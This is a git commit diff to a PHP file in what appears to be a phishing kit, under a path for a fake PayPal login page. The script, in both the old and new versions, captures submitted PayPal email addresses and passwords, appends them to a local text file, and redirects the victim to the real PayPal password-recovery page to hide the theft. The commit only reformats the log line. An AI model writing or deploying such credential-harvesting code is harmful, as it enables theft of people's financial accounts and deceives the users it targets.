027815bca6e2e13e3d3d6bdc8b572d93df2e32b6
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2019-11-27 21:13:44 +0600

    Update login.php

--- websites/paypal/login.php
+++ websites/paypal/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Paypal :- username : " . $_POST['login_email'] . "  ||  Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
 header('Location: https://www.paypal.com/authflow/password-recovery/');
 exit();
